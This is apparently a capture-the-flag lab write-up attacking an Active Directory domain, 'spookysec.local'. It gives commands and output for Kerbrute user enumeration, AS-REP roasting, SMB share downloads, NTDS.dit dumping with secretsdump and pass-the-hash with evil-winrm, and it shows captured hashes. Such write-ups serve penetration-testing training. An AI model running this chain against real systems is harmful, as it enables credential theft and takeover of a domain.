- You can use `enum4linux` to enumerate ports 139/445 

# Kerbrute

- If Kerberos is open, you can use a tool like `Kerbrute` to discover users, bruteforce passwords, and password spray.
- Credential bruteforcing is not recommended due to unknown account lockout policies

User enumeration: 
```bash
./kerbrute userenum /usr/share/wordlists/metasploit/mirai_user.txt -d spookysec.local --dc 10.10.172.119
```

# AS-REPRoasting basics
- **AS-REPRoasting** occurs when a user has the privilege "Does not require Pre-Authentication" set. 
- This means that the account does not need to provide authentication before requesting a Kerberos Ticket
- Impacket's `GetNPUsers.py` allows querying of AS-REProastable accounts (just provide valid usernames)

Find AS-REProastable hashes: 
```bash
python3 GetNPUsers.py -usersfile /usr/share/wordlists/tmp.txt -dc-ip 10.10.172.119 spookysec.local/
```

Result: 
```txt
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:b7aae4d185cfd18bfa7eb4c8f1682144$31258627d4013e1b6206632296d6a5df1a54b21725561db2d07204012c9ec5049f4ee550411967f98c0021080a46badd4d26cacafc14a823e99cfadacfd37c029268043642474bdec363721efa8b709cb2b74a87d45e568d7aba4059da3e822d141a0385b21803103f711b1355e178c8ad1b6bad36669e0d151f26953bf25d0f7febf5bf29577ab6eea082726a29059fe63a35af213f51384485af454f490dc126cee70fa591cb04190e09d530ddb1c24c86063d4b44b0b6efa1a3f053c60f129b47b7b3e1674ab58dc1ed7fda04bf6766c1c3f9e7bcea3a050a26cf989b8823de4b38ef1f89c7dd2c2ee2431e44aab7cdcb
```

You can now crack this hash using hashcat to get a password (make sure to look up the mode #)

# Enumerating SMB shares
- You can use `smbclient -L` to map remote SMB shares with the newly pwned account

Authenticate as user and list remote shares: 
```bash
smbclient -L 10.10.172.119 -U svc-admin
```

Download a whole share: 
```bash
smbclient //10.10.172.119/backup -U svc-admin              
smb: \> mask ""
smb: \> recurse
smb: \> prompt
smb: \> mget *
```

# Grabbing NTDS.dit with secretsdump
- With the new account, grab the `NTDS.dit` database with `secretsdump.py`

Grab NTDS.dit using `secretsdump.py`: 
```sh
python3 /opt/impacket/examples/secretsdump.py -just-dc-ntlm spookysec.local/backup@10.10.172.119 -o NTDS.dit
```

NTLM Hashes: 
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
...
```

The record broken down is username: (Administrator), userid: (500) , lmhash: (aad3b435b51404eeaad3b435b51404ee) and ntlmhash: (0e0363213e37b94221497260b0bcb4fc).

# Passing the hash with Evil-WinRM
- Finally, just pass the NTLM hash using evil-winrm

```bash
evil-winrm -i 10.10.172.119 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

DONE!